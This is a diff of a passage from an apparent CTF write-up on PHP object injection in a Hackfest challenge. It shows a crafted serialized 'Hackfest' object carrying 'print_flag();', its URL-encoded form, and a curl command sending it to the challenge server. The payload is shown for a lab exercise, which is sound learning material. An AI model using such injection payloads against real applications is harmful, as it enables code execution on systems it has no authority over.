@@ -13,5 +13,5 @@ https://www.owasp.org/index.php/PHP_Object_Injection </br>
 and i changed some parameters in the hackfest serilazed object, such as stirng lengths to conforme it with our inital php code :</br>
 <code> msg=O:8:"Hackfest":1:{s:14:"Hackfest hook";s:13:"print_flag();";} </code>
 with some url encode : </br>
-msg=O%3A8%3A%22Hackfest%22%3A1%3A%7Bs%3A14%3A%22Hackfest%20hook%22%3Bs%3A13%3A%22print_flag()%3B%22%3B%7D%20
+<code>msg=O%3A8%3A%22Hackfest%22%3A1%3A%7Bs%3A14%3A%22Hackfest%20hook%22%3Bs%3A13%3A%22print_flag()%3B%22%3B%7D%20</code>
 easy just  curl http://challenge.hackfest.tn:8080?msg=O%3A8%3A%22Hackfest%22%3A1%3A%7Bs%3A14%3A%22Hackfest%20hook%22%3Bs%3A13%3A%22print_flag()%3B%22%3B%7D%20 | grep 'hackfest'
